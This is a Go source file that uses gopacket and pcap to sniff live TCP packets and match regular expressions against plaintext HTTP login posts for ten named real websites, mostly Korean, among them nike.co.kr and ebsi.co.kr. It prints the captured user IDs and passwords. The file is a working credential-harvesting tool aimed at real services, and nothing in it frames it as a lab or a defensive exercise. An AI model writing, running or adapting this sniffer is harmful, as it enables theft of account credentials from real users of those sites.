package main

import (
	"fmt"
	"log"
	"regexp"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	reMap = map[string]*regexp.Regexp{
		"http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
		"http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
		"http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
		"http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
		"http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
		"http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
		"http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
		"http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
		"http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
	}
)

func parse(device pcap.Interface) {
	snapshot_len := int32(1024)
	promiscuous := false
	timeout := 30 * time.Second
	var err error
	var handle *pcap.Handle

	// Open device
	handle, err = pcap.OpenLive(device.Name, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		if tcpLayer != nil {
			tcpPacket := tcpLayer.(*layers.TCP)
			http := tcpPacket.Payload
			for url, re := range reMap {
				parsed := re.FindSubmatch(http)
				if len(parsed) == 3 {
					fmt.Println(url, ":", string(parsed[1]), string(parsed[2]))
				}
			}
		}
	}
}
